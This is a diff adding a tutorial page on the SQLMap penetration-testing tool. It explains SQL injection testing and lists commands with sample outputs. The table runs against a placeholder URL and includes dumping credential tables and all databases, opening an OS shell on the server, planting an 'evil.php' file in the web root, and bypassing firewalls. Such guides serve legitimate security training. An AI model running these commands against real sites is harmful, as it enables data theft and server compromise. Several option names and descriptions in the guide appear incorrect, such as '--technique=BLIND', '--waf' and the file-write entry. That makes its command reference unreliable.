@@ -1,0 +1,185 @@
+---
+title: "SQLMap"
+description: "SQLMap tool guide; includes tool's purpose,primary uses,core features,data sources, common commands and example of command's usages."
+tags: ['web', 'sql injection']
+---
+
+> _**"SQLMap's powerful detection engine and extensive range of features make it an indispensable tool for security professionals seeking to identify and mitigate SQL injection risks efficiently."**_ _**-Troy Hunt**_
+
+## What is the purpose of SQLMap?​
+
+**SQLMAP** is an **open source** penetration testing tool. SQLMAP automates the process of discovering SQL injection flaws and exploits them to access and provide control over database servers. In addition, it has advanced features, including its proprietary detection engine, in support of penetration testing.
+
+**Here are the primary uses of SQLMap:**
+
+  * **SQL Injection Testing:** SQLMap automates the detection and exploitation of SQL injection vulnerabilities in web applications. It systematically tests different payloads to identify weak points.
+  * **Database Schema:** SQLMap enumerates the databases, tables, and columns in a vulnerable database. It allows to consider the database schema in detail, so it is very important for further analysis.
+  * **Data Extraction:** SQLMap extracts user-requested data from a vulnerable database. Seeing the ability to extract data from the user may allow the impact of the vulnerability to be estimated.
+  * **Database Management:** SQLMap performs various database management tasks and executing spesific SQL commands. It allows security professionals to manage the database remotely, providing valuable insights into database configurations and settings.
+  * **Support for Multiple Databases:** SQLMap is compatible with various database management systems such as MySQL, PostgreSQL, Oracle, Microsoft SQL Server and SQLite. This versatility allows SQLMap to be used with more users in a variety of environments and to work more integrated with other tools.
+
+
+
+## Core Features​
+
+  * Automatic SQL Injection Detection
+  * Database Fingerprinting
+  * Database Enumeration
+  * Data Extraction
+  * Access to the File System
+  * Privilege Escalation
+  * Support for Multiple Database Systems
+  * Advanced Injection Techniques
+  * Customizable Payloads and Options
+  * Batch and Automation Support
+
+
+
+## Data sources​
+
+  * Target Application Data
+  * Database Management Systems (DBMS)
+  * Public Vulnerability Databases
+  * Security Advisories and Exploits
+  * Database Error Messages
+  * Network Traffic
+  * Input Parameters and Forms
+  * Historical Scan Data
+
+
+
+## Common SQLMap Commands​
+
+### 1\. Basic SQL Injection Test​
+
+  * This command provides that tests a given URL for SQL injection vulnerabilities. It simply shows the users if the target URL is vulnerable to SQL injection attacks by looking at the response for different SQL payloads.
+
+
+    
+    
+```
+sqlmap -u <target_URL>  
+```
+### 2\. Enumerating Databases​
+
+  * This command retrieves the list of all databases available in the target application and enumerates the data. It helps in understanding the database structure as it just returns the list of all available databases.
+
+
+    
+    
+```
+sqlmap -u <target_URL> --dbs  
+```
+### 3\. Enumerating Tables​
+
+  * This command lists the tables in a specific database by numbering them. Familiarizing SQLmap users with the structure and tables of the database will make it easier during the data extraction process.
+
+
+    
+    
+```
+sqlmap -u <target_URL> -D <database_name> --tables  
+```
+### 4\. Enumerating Columns​
+
+  * This command retrieves columns from a specific table. It provides insights into the data stored in the table by numbering and listing column names and data types, which is critical for data extraction.
+
+
+    
+    
+```
+sqlmap -u <target_URL> -D <database_name> -T <table_name> --columns  
+```
+### 5\. Data Extraction​
+
+  * This command retrieves data from a table in the database. Pulling data from the application under test is important for detecting vulnerabilities.
+
+
+    
+    
+```
+sqlmap -u <target_URL> -D <database_name> -T <table_name> --dump  
+```
+### 6\. Testing for Blind SQL Injection​
+
+  * This option checks for blind SQL injection vulnerabilities by injecting either time delays or Boolean conditions into the application response in case it is vulnerable to blind SQL injection.
+
+
+    
+    
+```
+sqlmap -u <target_URL> --technique=BLIND  
+```
+### 7\. Specifying a Custom HTTP Header​
+
+  * This option allows the user to specify a custom HTTP header for the request. It is useful for detecting a breach in the authentication process.
+
+
+    
+    
+```
+sqlmap -u <target_URL> --header="Custom-Header: Value"  
+```
+### 8\. Using Proxy for Traffic Analysis​
+
+  * This option makes SQLMap route its traffic via a given proxy. It's quite useful for intercepting and observing the HTTP traffic that SQLMap generates against the target application.The ability to perform traffic analysis makes a great contribution to the testing process.
+
+
+    
+    
+```
+sqlmap -u <target_URL> --proxy="http://127.0.0.1:8080"  
+```
+### 9\. Saving Output to a File​
+
+  * This option allows the output of SQLMap operations to be saved to a specified file. This is an important feature for reviewing and analyzing the results later.
+
+
+    
+    
+```
+sqlmap -u <target_URL> --output-dir=<directory>  
+```
+### 10\. Help and Usage Information​
+
+  * This command displays the help menu and usage information for SQLMap.
+
+
+    
+    
+```
+sqlmap -h  
+```
+  * Alternative usage:
+
+
+    
+    
+```
+sqlmap --help  
+```
+## Output Examples of SQLMap Commands​
+
+Command| Example Usage| Function| Output Example  
+---|---|---|---  
+Basic SQL Injection Test| `sqlmap -u "http://example.com/vulnerable.php?id=1"`| Tests a URL for SQL injection vulnerabilities.| `Parameter 'id' is vulnerable to boolean-based blind SQL injection`  
+Testing for Blind SQL Injection| `sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=BLIND`| Tests for blind SQL injection vulnerabilities.| `Vulnerable to time-based blind SQL injection`  
+Testing for Time-based SQL Injection| `sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=TIME`| Tests specifically for time-based SQL injection vulnerabilities.| `Vulnerable to time-based blind SQL injection`  
+Enumerating Databases| `sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs`| Retrieves the list of databases.| `available databases: information_schema, users, products`  
+Enumerating Tables| `sqlmap -u "http://example.com/vulnerable.php?id=1" -D users --tables`| Lists tables in the specified database.| `Table: accounts, orders, profiles`  
+Enumerating Columns| `sqlmap -u "http://example.com/vulnerable.php?id=1" -D users -T accounts --columns`| Lists columns in the specified table.| `Column: id, username, password`  
+Data Extraction| `sqlmap -u "http://example.com/vulnerable.php?id=1" -D users -T accounts --dump`| Extracts data from the specified table.| `id: 1, username: admin, password: 12345`  
+Dumping All Databases| `sqlmap -u "http://example.com/vulnerable.php?id=1" --dump-all`| Dumps all data from all databases.| `Dumping all databases...`  
+Specifying a Custom HTTP Header| `sqlmap -u "http://example.com/vulnerable.php?id=1" --header="Custom-Header: Value"`| Sends a request with a custom HTTP header.| `Request sent with custom header`  
+Using Cookies| `sqlmap -u "http://example.com/vulnerable.php?id=1" --cookie="SESSIONID=abc123"`| Uses specified cookies in the request.| `Request sent with specified cookies`  
+Using Proxy for Traffic Analysis| `sqlmap -u "http://example.com/vulnerable.php?id=1" --proxy="http://127.0.0.1:8080"`| Routes traffic through a specified proxy.| `Traffic routed through proxy`  
+Saving Output to a File| `sqlmap -u "http://example.com/vulnerable.php?id=1" --output-dir=output`| Saves output to the specified directory.| `Output saved to output directory`  
+Executing SQL Commands| `sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-shell`| Opens a SQL shell for manual SQL command execution.| `SQL shell opened.`  
+Running OS Shell Commands| `sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell`| Executes system commands on the target server.| `OS shell opened.`  
+Checking for File Inclusion| `sqlmap -u "http://example.com/vulnerable.php?id=1" --file-write=evil.php`| Checks for file inclusion vulnerabilities.| `File included successfully.`  
+Injecting Files| `sqlmap -u "http://example.com/vulnerable.php?id=1" --file-dest="/var/www/evil.php"`| Uploads a file to the target server.| `File uploaded successfully.`  
+Using a Configuration File| `sqlmap -u "http://example.com/vulnerable.php?id=1" --conf-file=config.txt`| Loads configuration options from a file.| `Configuration loaded from config.txt`  
+Using Verbose Mode| `sqlmap -u "http://example.com/vulnerable.php?id=1" --verbose=3`| Provides detailed output of the process.| `Verbose output enabled`  
+Specifying a User-Agent| `sqlmap -u "http://example.com/vulnerable.php?id=1" --user-agent="Mozilla/5.0"`| Sets a custom User-Agent for the request.| `Request sent with custom User-Agent`  
+Testing with Different Methods| `sqlmap -u "http://example.com/vulnerable.php?id=1" --method=POST --data="user=admin&pass=123"`| Specifies the HTTP method and data for testing.| `Request sent using POST method`  
+Bypassing WAFs| `sqlmap -u "http://example.com/vulnerable.php?id=1" --waf`| Attempts to bypass Web Application Firewalls.| `WAF bypass attempted`
